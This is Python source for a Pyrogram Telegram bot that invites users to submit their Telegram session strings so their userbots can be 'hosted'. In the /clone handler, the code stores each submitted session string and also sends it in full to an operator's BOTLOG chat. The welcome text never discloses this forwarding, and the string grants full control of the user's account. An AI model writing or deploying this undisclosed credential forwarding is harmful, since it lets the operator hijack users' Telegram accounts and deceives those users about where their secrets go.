from WhatTheR import *
from config import OWNER_ID, ALIVE_PIC, log_userbot, BOTLOG
from pyrogram import filters
import os
import re
import asyncio
import time
from pyrogram import *
from pyrogram.types import *

PHONE_NUMBER_TEXT = (
    "✘ Heya My Master👋!\n\n"
    "✘ I'm Your Assistant?\n\n"
    "‣ I can help you to host Your Left Clients.\n\n"
    "‣ Pls, read the following before proceeding:\n\n"
    "   - Your account may get deactivated or deleted unexpectedly.\n"
    "   - There might be limits on actions you can perform.\n"
    "   - Your account may get logged out at any time.\n\n"
    "‣ Make sure your User ID is not 7, 8, 9, or 10, and that you have been using Telegram for at least 5 months.\n\n"
    "‣ Please prepare your API_ID and API_HASH, as they are required to generate your Pyrogram session string.\n"
    "   You can generate your session string using the command `/generate` in @StrGeneratorBot.\n\n"
    "‣ After generating, send your session to here and using command /clone."
)

@ER.BOT("start")
async def hello(client: app, message):
    buttons = [
        [
            InlineKeyboardButton("✘ ᴜᴘᴅᴀᴛᴇꜱ ᴄʜᴀɴɴᴇʟ", url="t.me/Pamerdong"),
        ],
        [
            InlineKeyboardButton("✘ ꜱᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url="t.me/Er_Support_Group"),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(buttons)
    await client.send_photo(message.chat.id, ALIVE_PIC, caption=PHONE_NUMBER_TEXT, reply_markup=reply_markup)

@ER.BOT("clone")
async def clone(bot: app, msg: Message):
    if len(msg.command) < 2:
        await msg.reply("**Usage:**\n\n`/clone <session_string>`\n\nPlease provide your session string.")
        return

    session_string = msg.command[1]
    text = await msg.reply("Booting New Client...")
    try:
        await asyncio.sleep(5)
        client = Client(
            name="WhatHahh",
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            plugins=dict(root="WhatTheR/modules")
        )
        await client.start()
        user = await client.get_me()

        dB.add_ubot(user.id, API_ID, API_HASH, session_string)

        await msg.reply(f"Your Userbot Has Been Successfully Installed as {user.first_name} ✅.")
        await app.send_message(BOTLOG, f"New Client started:\n- User: {user.first_name}\n- Session String: `{session_string}`")
        
        await app.send_message(log_userbot, f"Userbot {user.first_name} is now active.")
    except Exception as e:
        await msg.reply(f"**ERROR:** `{str(e)}`\nPress /start to try again.")
